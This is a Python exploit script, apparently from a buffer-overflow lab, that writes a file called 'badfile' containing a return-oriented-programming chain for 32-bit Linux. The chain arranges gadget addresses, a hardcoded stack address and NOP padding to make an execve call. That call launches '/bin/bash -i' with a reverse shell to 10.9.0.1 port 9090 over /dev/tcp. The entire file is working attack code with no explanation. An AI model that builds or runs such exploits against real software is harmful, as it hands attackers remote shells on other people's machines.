#!/usr/bin/python3
import sys
POP_EAX = 0x080b003a            # pop eax ; ret
POP_EDX_EBX = 0x0805ebb9        # pop edx ; pop ebx ; ret
ADD_EAX = 0x080988a0            # add eax, 3 ; ret
ADD_2_EAX = 0x08098887          # add eax, 2 ; ret
MOV_EAX_7 = 0x08098920            # mov eax, 7 ; ret
XOR_EAX_EAX = 0x0804fe60        # xor eax, eax ; ret
XOR_ECX_ECX_RET = 0x0804a83f    # xor ecx, ecx ; int 0x80
MOV_ECX_EAX = 0x08098978        # mov ecx, eax ; mov eax, ecx ; ret
xchg_edx_eax_ret = 0x08073d56   # xchg edx, eax ; ret
INT_0X80 = 0x0804a4c2           # int 0x80
POP_EBX = 0x08049022            # pop ebx ; ret
POP_EAX_EDX_EBX= 0x0805ebb8     # pop eax ; pop edx ; pop ebx ; ret
XCHG_EDX_EAX= 0x08073d46        # xchg edx, eax ; ret
buf_addr = 0xffffd168
main_str_addr = buf_addr + 0x49f
bash_addr = main_str_addr + 300
zero_addr = main_str_addr + 400
content = bytearray(0x90 for i in range(517))
bash_str = b"/bin/bash\x00"
content[300:300+len(bash_str)] = bash_str
content[310:313] = b"-c\x00"
cmd_str = b"/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1'\x00"
content[313:313+len(cmd_str)] = cmd_str
zero_str = b"\x00\x00\x00\x00"
content[400:404] = zero_str
content[200:204] = (bash_addr).to_bytes(4, byteorder='little')
content[204:208] = (main_str_addr + 310).to_bytes(4, byteorder='little')
content[208:212] = (main_str_addr + 313).to_bytes(4, byteorder='little')
content[212:216] = (0x00000000).to_bytes(4, byteorder='little')
offset = 116

content[offset:offset + 4] = (POP_EAX_EDX_EBX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (main_str_addr + 200).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (main_str_addr + 200).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (bash_addr).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (MOV_ECX_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (XOR_EAX_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (XCHG_EDX_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (XOR_EAX_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (MOV_EAX_7).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (ADD_2_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (ADD_2_EAX).to_bytes(4, byteorder='little')
offset += 4
content[offset:offset + 4] = (INT_0X80).to_bytes(4, byteorder='little')
offset += 4
with open('badfile', 'wb') as f:
    f.write(content)
